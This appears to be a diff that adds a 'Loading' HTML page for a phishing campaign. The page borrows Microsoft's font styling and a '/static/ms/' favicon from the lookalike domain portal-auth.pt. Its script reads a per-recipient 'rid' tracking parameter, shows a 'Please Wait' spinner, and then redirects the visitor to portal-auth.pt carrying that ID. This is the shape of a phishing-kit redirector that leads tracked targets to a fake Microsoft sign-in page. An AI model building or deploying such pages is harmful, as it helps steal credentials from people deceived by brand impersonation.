@@ -1,0 +1,85 @@
+<!DOCTYPE>
+<html lang='en'>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading</title>
+    <link rel="icon" href="https://portal-auth.pt/static/ms/favicon.ico" />
+    <style>
+
+        body {
+            
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+        }
+
+        .loading-gif {
+            max-width: 500px;
+            height: auto;
+        }
+        .container {
+            text-align: center;
+        }
+
+        .text{
+            font-size: 25px;
+            color: #1b1b1b;
+            
+        }
+
+        .pre-loader {
+            z-index: 100; /** make sure this is the highest value compared to all other divs **/
+           
+        }
+
+        .pre-loader.hidden {
+            animation: fadeOut 2s; /** change to 1s */
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes fadeOut {
+            100% {
+                opacity: 0;
+                visibility: hidden;
+            }
+        }
+    </style>
+</head>
+<body>
+<!--- Your content goes here -->
+
+<div class='pre-loader container'>
+    <img class='loading-gif' alt='loading' src="m2.gif"/>
+    <div class="text"> Please Wait ...</div>
+</div>
+
+<!-- js to hide preloader loading is done -->
+<script type='text/javascript'>
+    window.addEventListener('load', function () {
+        //document.querySelector('.pre-loader').className += ' hidden';// A URL atual da página
+        const urlAtual = window.location.href;
+
+        // Acessando os parâmetros da URL
+        const params = new URLSearchParams(window.location.search);
+
+        // Exemplo: Obter o valor do parâmetro 'nome'
+        const rid = params.get('rid');
+        console.log(rid);
+        setTimeout(() => {
+            document.querySelector('.pre-loader').className += ' hidden';
+            setTimeout(() => {
+                window.location.href = 'https://portal-auth.pt?rid='+rid;
+            }, 1500);
+        }, 3500);
+
+    });
+</script>
+</body>
+</html>
